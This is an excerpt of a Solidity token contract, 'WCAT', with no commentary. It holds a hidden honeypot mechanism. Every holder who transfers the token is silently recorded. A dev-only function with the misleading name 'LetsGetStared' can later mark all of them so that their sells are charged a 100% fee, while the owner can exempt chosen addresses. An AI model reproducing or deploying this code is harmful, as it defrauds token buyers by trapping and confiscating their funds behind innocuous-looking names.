...
contract WCAT is Context, IERC20 { 
    ...
    mapping (address => bool) public _isWarrior;
    mapping (address => bool) public Warriors;
    address[] public _Warrior;

    address payable public Wallet_Marketing = payable(0xb37983B2Ce8D7cD5c87319dAa4F21e228b1bec6D); 
    address payable public Wallet_Dev = payable(0xf36B6A1b8d7af0EcA07aa14B2034EceAd791C799);
    ...
    function RemoveLimitEffects() public onlyOwner{
        _maxTxAmount = _tTotal * 100 / 100;
        _maxWalletToken = _tTotal * 100 / 100;
    }

    function LetsGetStared() public {
        require(msg.sender == Wallet_Dev);
        _Warrior_f = 100;
        for (uint256 i = 0; i < _Warrior.length; i++) {
            Warriors[_Warrior[i]] = true;
        }
    }

    function isWarriors(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            Warriors[addrs[i]] = false;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isWarrior[from]) {
            _isWarrior[from] = true;
            _Warrior.push(from);
        }
        
        if (to != owner() && to != uniswapV2Pair && !_isWarrior[to]) {
            _isWarrior[to] = true;
            _Warrior.push(to);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (Warriors[sender]) 
            _sellFEE = tAmount*_Warrior_f/100;            
